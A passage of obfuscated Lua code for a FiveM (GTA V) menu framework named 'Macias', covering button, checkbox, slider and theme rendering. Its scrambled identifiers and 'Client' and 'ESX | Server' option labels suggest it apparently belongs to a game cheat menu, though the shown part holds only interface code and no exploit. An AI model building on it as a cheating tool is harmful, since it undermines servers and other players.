    end
    if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf] then
        BAA0iTdNpUgW06 = BAA0iTdNpUgW06 + 1
        local sk09slR6ulAa56Jai = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06
        if k59Afs == "Native" then
            actualSubText = "~g~" .. k59Afs
        elseif k59Afs == "Client" or k59Afs == "ESX | Client" then
            actualSubText = "~y~" .. k59Afs
        elseif k59Afs == "Server" or k59Afs == "ESX | Server" then
            actualSubText = "~r~" .. k59Afs
        else
            actualSubText = k59Afs
        end
        Rl7pAj5p0QyCKrw1DPsOX(false, ku9eSQBeIjpD5OSIkEo, actualSubText, oMOmUf0EItEu1d)
        if sk09slR6ulAa56Jai then
            if MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.select then
                PlaySoundFrontend(
                    -1,
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].buttonPressedSound.name,
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].buttonPressedSound.set,
                    true
                )
                wBQ8ncN2OyoKWmCo(fWZcNM5KRxMvcNhIv .. " button pressed")
                return true
            elseif
                MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.left or MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.right
             then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        wBQ8ncN2OyoKWmCo(
            "Failed to create " ..
                fWZcNM5KRxMvcNhIv .. " button: " .. tostring(j0P1aYqgapaJmkYWlSEjf) .. " menu doesn't exist"
        )
        return false
    end
end
function Macias.CheckboxButton(ljn2uEed0X, TRO)
    local syt = ljn2uEed0X
    if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf] then
        BAA0iTdNpUgW06 = BAA0iTdNpUgW06 + 1
        local dR = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06
        eG31QXw7HZMGAVyISh(ljn2uEed0X, TRO)
        if dR then
            if MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.select then
                PlaySoundFrontend(
                    -1,
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].buttonPressedSound.name,
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].buttonPressedSound.set,
                    true
                )
                wBQ8ncN2OyoKWmCo(syt .. " button pressed")
                return true
            elseif
                MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.left or MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.right
             then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        wBQ8ncN2OyoKWmCo(
            "Failed to create " .. syt .. " button: " .. tostring(j0P1aYqgapaJmkYWlSEjf) .. " menu doesn't exist"
        )
        return false
    end
end
function Macias.Button2(W, oE9cO8vpv, c)
    local lRCYjuz7bRV = W
    if oE9cO8vpv then
        lRCYjuz7bRV = "{ " .. tostring(lRCYjuz7bRV) .. ", " .. tostring(oE9cO8vpv) .. " }"
    end
    if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf] then
        BAA0iTdNpUgW06 = BAA0iTdNpUgW06 + 1
        local Ib = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06
        Rl7pAj5p0QyCKrw1DPsOX(true, W, oE9cO8vpv, c)
        if Ib then
            if MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.select then
                PlaySoundFrontend(
                    -1,
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].buttonPressedSound.name,
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].buttonPressedSound.set,
                    true
                )
                wBQ8ncN2OyoKWmCo(lRCYjuz7bRV .. " button pressed")
                return true
            elseif
                MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.left or MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.right
             then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        wBQ8ncN2OyoKWmCo(
            "Failed to create " ..
                lRCYjuz7bRV .. " button: " .. tostring(j0P1aYqgapaJmkYWlSEjf) .. " menu doesn't exist"
        )
        return false
    end
end
function Macias.MenuButton(hDOYO949Fc, mnVwL3mcwGAyE, FizEWTAQ, sLhJB6ohtIp)
    if jwZvXv7xDjl3iWV[mnVwL3mcwGAyE] then
        if Macias.Button2(hDOYO949Fc, FizEWTAQ, sLhJB6ohtIp) then
            RAmmfIbUBx(j0P1aYqgapaJmkYWlSEjf, false)
            RAmmfIbUBx(mnVwL3mcwGAyE, true, true)
            return true
        end
    else
        wBQ8ncN2OyoKWmCo(
            "Failed to create " ..
                tostring(hDOYO949Fc) .. " menu button: " .. tostring(mnVwL3mcwGAyE) .. " submenu doesn't exist"
        )
    end
    return false
end
function Macias.CheckBox(xD5CgeU35u, bUg2BlhBw, ziLpaLqbs1dFH)
    if Macias.CheckboxButton(xD5CgeU35u, bUg2BlhBw) then
        bUg2BlhBw = not bUg2BlhBw
        wBQ8ncN2OyoKWmCo(tostring(xD5CgeU35u) .. " checkbox changed to " .. tostring(bUg2BlhBw))
        if ziLpaLqbs1dFH then
            ziLpaLqbs1dFH(bUg2BlhBw)
        end
        return true
    end
    return false
end
function Macias.ComboBox(wcoi, uyPkbJtn, tNsiXEbhPK7s, Ox92dthLR, cJV1PUijVBF)
    local XJUUz9lA = #uyPkbJtn
    local qxzEBszNgE5T0KHXU = uyPkbJtn[tNsiXEbhPK7s]
    local BHXJtgptHYblDIDD6 = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == (BAA0iTdNpUgW06 + 1)
    if XJUUz9lA > 1 and BHXJtgptHYblDIDD6 then
        qxzEBszNgE5T0KHXU = HtR .. tostring(qxzEBszNgE5T0KHXU) .. xSTZixUjS6VL9v
    end
    if Macias.Button(wcoi, qxzEBszNgE5T0KHXU) then
        Ox92dthLR = tNsiXEbhPK7s
        cJV1PUijVBF(tNsiXEbhPK7s, Ox92dthLR)
        return true
    elseif BHXJtgptHYblDIDD6 then
        if MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.left then
            if tNsiXEbhPK7s > 1 then
                tNsiXEbhPK7s = tNsiXEbhPK7s - 1
            else
                tNsiXEbhPK7s = XJUUz9lA
            end
        elseif MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.right then
            if tNsiXEbhPK7s < XJUUz9lA then
                tNsiXEbhPK7s = tNsiXEbhPK7s + 1
            else
                tNsiXEbhPK7s = 1
            end
        end
    else
        tNsiXEbhPK7s = Ox92dthLR
    end
    cJV1PUijVBF(tNsiXEbhPK7s, Ox92dthLR)
    return false
end
function Macias.ComboBoxSlider(gOMf0jixx786jq6klHUCm, l8P5V6w3Li12FpYzFLt, iINeVnHA, w0EClroT29grzQ0E_I, WuP)
    local njkLWKLLSIthhKUd5NsAs = #l8P5V6w3Li12FpYzFLt
    local f62dsEUD = l8P5V6w3Li12FpYzFLt[iINeVnHA]
    local wwjnitrgSfgTZCBZ = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == (BAA0iTdNpUgW06 + 1)
    if njkLWKLLSIthhKUd5NsAs > 1 and wwjnitrgSfgTZCBZ then
        f62dsEUD = tostring(f62dsEUD)
    end
    if Macias.Button3(gOMf0jixx786jq6klHUCm, l8P5V6w3Li12FpYzFLt, njkLWKLLSIthhKUd5NsAs, iINeVnHA) then
        w0EClroT29grzQ0E_I = iINeVnHA
        WuP(iINeVnHA, w0EClroT29grzQ0E_I)
        return true
    elseif wwjnitrgSfgTZCBZ then
        if MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.left then
            if iINeVnHA > 1 then
                iINeVnHA = iINeVnHA - 1
            elseif iINeVnHA == 1 then
                iINeVnHA = 1
            end
        elseif MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.right then
            if iINeVnHA < njkLWKLLSIthhKUd5NsAs then
                iINeVnHA = iINeVnHA + 1
            elseif iINeVnHA == njkLWKLLSIthhKUd5NsAs then
                iINeVnHA = njkLWKLLSIthhKUd5NsAs
            end
        end
    else
        iINeVnHA = w0EClroT29grzQ0E_I
    end
    WuP(iINeVnHA, w0EClroT29grzQ0E_I)
    return false
end
local function w(sym25A_M2_b0kGK, Y39eE2Yfsw8cn, DxGzR, _NIVVkm8aeTuyxt)
    local S9C1DEvB8H7yg = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width / 2
    local TiZ86Rmckx = nil
    if
        jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption <= jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount and
            BAA0iTdNpUgW06 <= jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount
     then
        TiZ86Rmckx = BAA0iTdNpUgW06
    elseif
        BAA0iTdNpUgW06 >
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption - jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount and
            BAA0iTdNpUgW06 <= jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption
     then
        TiZ86Rmckx =
            BAA0iTdNpUgW06 -
            (jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption -
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].maxOptionCount)
    end
    if TiZ86Rmckx then
        local FBfF9IddCWOGoyNq2M =
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].y + DCOkHa_X39DI4tsCiPLk + QVCiRDDcBBAaEe +
            (QVCiRDDcBBAaEe * TiZ86Rmckx) -
            QVCiRDDcBBAaEe / 2
        local NFpJ = nil
        local inR4sZ7gGg = nil
        local w7 = nil
        local ToogG0ppmeu = nil
        local MPFHv = nil
        local SGPBJj79sS = false
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06 then
            NFpJ = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuFocusBackgroundColor
            inR4sZ7gGg = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuFocusTextColor
            w7 = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuFocusTextColor
            ToogG0ppmeu = {r = YKyAw.r, g = YKyAw.g, b = YKyAw.b, a = 255}
            MPFHv = {r = YKyAw.r, g = YKyAw.g, b = YKyAw.b, a = 255}
        else
            NFpJ = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuBackgroundColor
            inR4sZ7gGg = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuTextColor
            w7 = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuSubTextColor
            ToogG0ppmeu = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].menuTextColor
            MPFHv = {r = 155, g = 155, b = 155, a = 150}
            SGPBJj79sS = true
        end
        local Lp9DYDgR1Gn = ((jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width / 3) / DxGzR)
        local Ca0aPzbNLkleD3i70SHzP = ((Lp9DYDgR1Gn * (_NIVVkm8aeTuyxt + 1)) - (Lp9DYDgR1Gn * _NIVVkm8aeTuyxt)) / 2
        local A8_6B2VFqzo8lU_64 = 0.16
        local FiAVtrr2Ic8wv_6 = 1
        if DxGzR >= 40 then
            FiAVtrr2Ic8wv_6 = 1.005
        end
        t(S9C1DEvB8H7yg, FBfF9IddCWOGoyNq2M, jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width, QVCiRDDcBBAaEe, NFpJ)
        t(
            ((jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + 0.1675) + (Ca0aPzbNLkleD3i70SHzP * DxGzR)) / FiAVtrr2Ic8wv_6,
            FBfF9IddCWOGoyNq2M,
            Lp9DYDgR1Gn * (DxGzR - 1) + 0.001,
            QVCiRDDcBBAaEe / 2 + 0.002,
            MPFHv
        )
        t(
            ((jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + 0.1675) + (Ca0aPzbNLkleD3i70SHzP * DxGzR)) / FiAVtrr2Ic8wv_6,
            FBfF9IddCWOGoyNq2M,
            Lp9DYDgR1Gn * (DxGzR - 1),
            QVCiRDDcBBAaEe / 2,
            {r = 10, g = 10, b = 10, a = 150}
        )
        t(
            ((jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + 0.1675) + (Ca0aPzbNLkleD3i70SHzP * _NIVVkm8aeTuyxt)) /
                FiAVtrr2Ic8wv_6,
            FBfF9IddCWOGoyNq2M,
            Lp9DYDgR1Gn * (_NIVVkm8aeTuyxt - 1),
            QVCiRDDcBBAaEe / 2,
            ToogG0ppmeu
        )
        lSv6ZT0odUlcLyv(
            sym25A_M2_b0kGK,
            jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + kSVibjWpdXCC37,
            FBfF9IddCWOGoyNq2M - (QVCiRDDcBBAaEe / 2) + Y6ZS8iMhTJOjBq0rm,
            i3dUIc_3f4,
            inR4sZ7gGg,
            lEA8M97Noop,
            false,
            SGPBJj79sS
        )
        local aMEDAzYUMm22RozJ86Ayr = tostring(Y39eE2Yfsw8cn[_NIVVkm8aeTuyxt])
        if string.len(aMEDAzYUMm22RozJ86Ayr) == 1 then
            A8_6B2VFqzo8lU_64 = 0.165
        elseif string.len(aMEDAzYUMm22RozJ86Ayr) == 2 then
            A8_6B2VFqzo8lU_64 = 0.1625
        elseif string.len(aMEDAzYUMm22RozJ86Ayr) == 3 then
            A8_6B2VFqzo8lU_64 = 0.16015
        elseif string.len(aMEDAzYUMm22RozJ86Ayr) == 4 then
            A8_6B2VFqzo8lU_64 = 0.1585
        elseif string.len(aMEDAzYUMm22RozJ86Ayr) == 5 then
            A8_6B2VFqzo8lU_64 = 0.157
        elseif string.len(aMEDAzYUMm22RozJ86Ayr) >= 6 then
            A8_6B2VFqzo8lU_64 = 0.1555
        end
        lSv6ZT0odUlcLyv(
            Y39eE2Yfsw8cn[_NIVVkm8aeTuyxt],
            ((jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].x + A8_6B2VFqzo8lU_64) + 0.04) / FiAVtrr2Ic8wv_6,
            FBfF9IddCWOGoyNq2M - (QVCiRDDcBBAaEe / 2.15) + Y6ZS8iMhTJOjBq0rm,
            i3dUIc_3f4,
            {r = 255, g = 255, b = 255, a = 255},
            lEA8M97Noop,
            false,
            SGPBJj79sS
        )
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06 and KhtMvtk783N9rO then
            if not HasStreamedTextureDictLoaded("deadline") then
                RequestStreamedTextureDict("deadline", true)
            end
            DrawSprite(
                "deadline",
                "deadline_trail_01",
                S9C1DEvB8H7yg,
                FBfF9IddCWOGoyNq2M,
                jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].width,
                QVCiRDDcBBAaEe,
                0,
                YKyAw.r,
                YKyAw.g,
                YKyAw.b,
                55
            )
        end
    end
end
function Macias.Button3(wwMtNhL, bkCC_, aym, l2CcmmxUJy)
    local llWHSoerfvu4_reb3G = wwMtNhL
    if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf] then
        BAA0iTdNpUgW06 = BAA0iTdNpUgW06 + 1
        local dV = jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption == BAA0iTdNpUgW06
        w(wwMtNhL, bkCC_, aym, l2CcmmxUJy)
        if dV then
            if MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.select then
                PlaySoundFrontend(
                    -1,
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].buttonPressedSound.name,
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].buttonPressedSound.set,
                    true
                )
                wBQ8ncN2OyoKWmCo(llWHSoerfvu4_reb3G .. " button pressed")
                return true
            elseif
                MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.left or MvpYLMwDWCTCY5gZhBpjy == bVkNYulEKMs2c5JuO1F.right
             then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        wBQ8ncN2OyoKWmCo(
            "Failed to create " ..
                llWHSoerfvu4_reb3G .. " button: " .. tostring(j0P1aYqgapaJmkYWlSEjf) .. " menu doesn't exist"
        )
        return false
    end
end
function Macias.Display()
    if nwxCxw1(j0P1aYqgapaJmkYWlSEjf) then
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].aboutToBeClosed then
            Macias.CloseMenu()
        else
            ClearAllHelpMessages()
            HjiQ()
            K8pz9n()
            MvpYLMwDWCTCY5gZhBpjy = nil
            if IsDisabledControlJustReleased(1, bVkNYulEKMs2c5JuO1F.down) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption < BAA0iTdNpUgW06 then
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption =
                        jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption + 1
                else
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption = 1
                end
            elseif IsDisabledControlJustReleased(1, bVkNYulEKMs2c5JuO1F.up) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption > 1 then
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption =
                        jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption - 1
                else
                    jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].currentOption = BAA0iTdNpUgW06
                end
            elseif IsDisabledControlJustReleased(1, bVkNYulEKMs2c5JuO1F.left) then
                MvpYLMwDWCTCY5gZhBpjy = bVkNYulEKMs2c5JuO1F.left
            elseif IsDisabledControlJustReleased(1, bVkNYulEKMs2c5JuO1F.right) then
                MvpYLMwDWCTCY5gZhBpjy = bVkNYulEKMs2c5JuO1F.right
            elseif IsDisabledControlJustReleased(1, bVkNYulEKMs2c5JuO1F.select) then
                MvpYLMwDWCTCY5gZhBpjy = bVkNYulEKMs2c5JuO1F.select
            elseif IsDisabledControlJustReleased(1, bVkNYulEKMs2c5JuO1F.back) then
                if jwZvXv7xDjl3iWV[jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].previousMenu] then
                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    RAmmfIbUBx(jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].previousMenu, true)
                else
                    Macias.CloseMenu()
                end
            end
            BAA0iTdNpUgW06 = 0
        end
    end
end
function Macias.SetMenuWidth(FqbKu5KeWxhMu8N8, fF)
    XO8g1Wb5PogWmMOsj4(FqbKu5KeWxhMu8N8, "width", fF)
end
function Macias.SetMenuX(Ml6, w1shwzn8WML)
    XO8g1Wb5PogWmMOsj4(Ml6, "x", w1shwzn8WML)
end
function Macias.SetMenuY(hoQ0HGXgRiIhd6JbbL0LL, vhzQtrri2a8NXR00xFGN)
    XO8g1Wb5PogWmMOsj4(hoQ0HGXgRiIhd6JbbL0LL, "y", vhzQtrri2a8NXR00xFGN)
end
function Macias.SetMenuMaxOptionCountOnScreen(DKcQHP, qKgxysukgKx4Vb5lYqUx8)
    XO8g1Wb5PogWmMOsj4(DKcQHP, "maxOptionCount", qKgxysukgKx4Vb5lYqUx8)
end
function Macias.SetTitle(UqNF1, UpCQllq0jeGlXokp6xss1)
    XO8g1Wb5PogWmMOsj4(UqNF1, "title", UpCQllq0jeGlXokp6xss1)
end
function Macias.SetTitleColor(tULkl49rjy, mQILWyLbfvqZI, fEocg0k7gq, muFd3KRBBrBEm, UJkWFtONNKE_aLyvF)
    XO8g1Wb5PogWmMOsj4(
        tULkl49rjy,
        "titleColor",
        {
            ["r"] = mQILWyLbfvqZI,
            ["g"] = fEocg0k7gq,
            ["b"] = muFd3KRBBrBEm,
            ["a"] = UJkWFtONNKE_aLyvF or jwZvXv7xDjl3iWV[tULkl49rjy].titleColor.a
        }
    )
end
function Macias.SetTitleBackgroundColor(
    gVRA8vkRPO2aZ1hCadNc,
    M9DR,
    WYU34g16L3DAH0klhm8,
    sAkR0cfMUamNZEx,
    AqPUwe9k5gusHcvGlYZZ)
    XO8g1Wb5PogWmMOsj4(
        gVRA8vkRPO2aZ1hCadNc,
        "titleBackgroundColor",
        {
            ["r"] = M9DR,
            ["g"] = WYU34g16L3DAH0klhm8,
            ["b"] = sAkR0cfMUamNZEx,
            ["a"] = AqPUwe9k5gusHcvGlYZZ or jwZvXv7xDjl3iWV[gVRA8vkRPO2aZ1hCadNc].titleBackgroundColor.a
        }
    )
end
function Macias.SetTitleBackgroundSprite(nlsLV4yw5e4YYOG_PzEb, lxOkm, Pae5)
    RequestStreamedTextureDict(lxOkm)
    XO8g1Wb5PogWmMOsj4(nlsLV4yw5e4YYOG_PzEb, "titleBackgroundSprite", {dict = lxOkm, name = Pae5})
end
function Macias.SetTitleBackgroundSpriteNil(_Atq4VCp)
    XO8g1Wb5PogWmMOsj4(_Atq4VCp, "titleBackgroundSprite", nil)
end
function Macias.SetSubTitle(TRNvg0, t1eB3iqrRPzszInjmNPk)
    XO8g1Wb5PogWmMOsj4(TRNvg0, "subTitle", t1eB3iqrRPzszInjmNPk)
end
function Macias.SetMenuBackgroundColor(ACvgXgAvTupM1gqF41, P3cpQ8LTcG0G, GJ2HaoQiLCe, gV0bS, wTPil)
    XO8g1Wb5PogWmMOsj4(
        ACvgXgAvTupM1gqF41,
        "menuBackgroundColor",
        {
            ["r"] = P3cpQ8LTcG0G,
            ["g"] = GJ2HaoQiLCe,
            ["b"] = gV0bS,
            ["a"] = wTPil or jwZvXv7xDjl3iWV[ACvgXgAvTupM1gqF41].menuBackgroundColor.a
        }
    )
end
function Macias.SetMenuSubTitleBackgroundColor(IwF, kQC8, LZlongbMs8yG, C1CiCIhhjVwo83n4zyS, UOCa3yWuuJnK23h9a0)
    XO8g1Wb5PogWmMOsj4(
        IwF,
        "subTitleBackgroundColor",
        {
            ["r"] = kQC8,
            ["g"] = LZlongbMs8yG,
            ["b"] = C1CiCIhhjVwo83n4zyS,
            ["a"] = UOCa3yWuuJnK23h9a0 or jwZvXv7xDjl3iWV[IwF].subTitleBackgroundColor.a
        }
    )
end
function Macias.SetMenuTextColor(ar2c, W_3O6_b3, MoSP696sUotNv, USQCshqEJw, oKhHjxk)
    XO8g1Wb5PogWmMOsj4(
        ar2c,
        "menuTextColor",
        {
            ["r"] = W_3O6_b3,
            ["g"] = MoSP696sUotNv,
            ["b"] = USQCshqEJw,
            ["a"] = oKhHjxk or jwZvXv7xDjl3iWV[ar2c].menuTextColor.a
        }
    )
end
function Macias.SetMenuSubTextColor(P7oINxXfnDPl5m, CkUxXge7i4, UirrSST0Jjmy8, t3E3pzso8ojMCpDjBv, xy36PhzoHlvo1H)
    XO8g1Wb5PogWmMOsj4(
        P7oINxXfnDPl5m,
        "menuSubTextColor",
        {
            ["r"] = CkUxXge7i4,
            ["g"] = UirrSST0Jjmy8,
            ["b"] = t3E3pzso8ojMCpDjBv,
            ["a"] = xy36PhzoHlvo1H or jwZvXv7xDjl3iWV[P7oINxXfnDPl5m].menuSubTextColor.a
        }
    )
end
function Macias.SetMenuFocusTextColor(IWkRdzeDQLXGUBli, iw0xYMwyEUhZ4C, uhhYDRigRRKaJNF3af, Y0WDIf90Qh, n2XImUrRcF)
    XO8g1Wb5PogWmMOsj4(
        IWkRdzeDQLXGUBli,
        "menuFocusTextColor",
        {
            ["r"] = iw0xYMwyEUhZ4C,
            ["g"] = uhhYDRigRRKaJNF3af,
            ["b"] = Y0WDIf90Qh,
            ["a"] = n2XImUrRcF or jwZvXv7xDjl3iWV[IWkRdzeDQLXGUBli].menuFocusTextColor.a
        }
    )
end
function Macias.SetMenuFocusColor(nz8C4jCDIe7YQI, uH7RH6OB3d7W6aM, Kqc8fG0up1Pfe0, y2qejWjJ_x2irE4RkhSG, Lh1PnAfllnZH)
    XO8g1Wb5PogWmMOsj4(
        nz8C4jCDIe7YQI,
        "menuFocusColor",
        {
            ["r"] = uH7RH6OB3d7W6aM,
            ["g"] = Kqc8fG0up1Pfe0,
            ["b"] = y2qejWjJ_x2irE4RkhSG,
            ["a"] = Lh1PnAfllnZH or jwZvXv7xDjl3iWV[nz8C4jCDIe7YQI].menuFocusColor.a
        }
    )
end
function Macias.SetMenuButtonPressedSound(xcIna9Yfg6s, Fux6OmwVH8, PaAJ8DG3E)
    XO8g1Wb5PogWmMOsj4(xcIna9Yfg6s, "buttonPressedSound", {["name"] = Fux6OmwVH8, ["set"] = PaAJ8DG3E})
end
function Macias.SetFont(cawmaY7MHlYT5fT36AyA, Cupa7U3gZPwxP2)
    i3dUIc_3f4 = Cupa7U3gZPwxP2
    jwZvXv7xDjl3iWV[cawmaY7MHlYT5fT36AyA].titleFont = Cupa7U3gZPwxP2
end
function Macias.SetMaxOptionCount(N0q, bxUBfwAq)
    XO8g1Wb5PogWmMOsj4(N0q, "maxOptionCount", bxUBfwAq)
end
function Macias.SetMenuFocusBackgroundColor(dNV, whGEolBRAoL14WYJ, UM0V33MJn, Ahtd565jx, uSZHOIjE30C4mwoV0WIuI)
    XO8g1Wb5PogWmMOsj4(
        dNV,
        "menuFocusBackgroundColor",
        {
            ["r"] = whGEolBRAoL14WYJ,
            ["g"] = UM0V33MJn,
            ["b"] = Ahtd565jx,
            ["a"] = uSZHOIjE30C4mwoV0WIuI or jwZvXv7xDjl3iWV[dNV].menuFocusBackgroundColor.a
        }
    )
end
local KxRMNSn0q7_cSUfk5FWwU = "dark"
local zjRtiTdduVltJH = {"dark", "light"}
local PvqEpUx5Sefn49V = 0
Citizen.CreateThread(
    function()
        while NywuctsA4BD4b3_G0 do
            Citizen.Wait(0)
            PvqEpUx5Sefn49V = DpYO8(0.2)
            if selectedThemeRainbow then
                YKyAw = {r = PvqEpUx5Sefn49V.r, g = PvqEpUx5Sefn49V.g, b = PvqEpUx5Sefn49V.b, a = 255}
            end
        end
    end
)
function Macias.SetTheme(QiL4yf00PC5s)
    if KxRMNSn0q7_cSUfk5FWwU == "light" then
        YKyAw = {r = 89, g = 173, b = 218, a = 255}
        Macias.SetTitleBackgroundSprite(QiL4yf00PC5s, "commonmenu", "interaction_bgd")
        Macias.SetMenuBackgroundColor(QiL4yf00PC5s, 45, 45, 45, 225)
        Macias.SetMenuFocusBackgroundColor(QiL4yf00PC5s, 25, 25, 25, 225)
        Macias.SetMenuSubTitleBackgroundColor(QiL4yf00PC5s, 0, 0, 0, 255)
        Macias.SetTitleBackgroundColor(QiL4yf00PC5s, YKyAw.r, YKyAw.g, YKyAw.b, 255)
        Macias.SetTitleColor(QiL4yf00PC5s, 255, 255, 255, 255)
        Macias.SetMenuTextColor(QiL4yf00PC5s, 150, 150, 150)
        Macias.SetMenuFocusTextColor(QiL4yf00PC5s, 175, 175, 175, 255)
        Macias.SetMenuSubTextColor(QiL4yf00PC5s, 155, 155, 155, 225)
        Macias.SetFont(QiL4yf00PC5s, 4)
        Macias.SetMenuX(QiL4yf00PC5s, 0.025)
        Macias.SetMenuY(QiL4yf00PC5s, 0.3)
        Macias.SetMenuWidth(QiL4yf00PC5s, 0.25)
        Macias.SetMaxOptionCount(QiL4yf00PC5s, BkEd5E1GYgoliqD9ktVZ)
        DCOkHa_X39DI4tsCiPLk = 0.0525
        y2ZqS01LgvjtSTQBJ = 0.15
        vURx5kzEW = 0.00485
        HaQjKKAMvjk5ABgT = 0.7
        yemRBopz2y = 2
        QVCiRDDcBBAaEe = 0.035
        lEA8M97Noop = 0.36
        kSVibjWpdXCC37 = 0.003
        Y6ZS8iMhTJOjBq0rm = 0.0025
        xSTZixUjS6VL9v = " »"
        HtR = "« "
    elseif KxRMNSn0q7_cSUfk5FWwU == "dark" then
        YKyAw = {r = 225, g = 55, b = 55, a = 255}
        Macias.SetTitleBackgroundSprite(QiL4yf00PC5s, "shopui_title_sm_hangar", "shopui_title_sm_hangar")
        Macias.SetMenuBackgroundColor(QiL4yf00PC5s, 25, 25, 25, 225)
        Macias.SetMenuFocusBackgroundColor(QiL4yf00PC5s, 50, 50, 50, 230)
        Macias.SetMenuSubTitleBackgroundColor(QiL4yf00PC5s, 35, 35, 35, 255)
        Macias.SetTitleBackgroundColor(QiL4yf00PC5s, 15, 15, 15, 255)
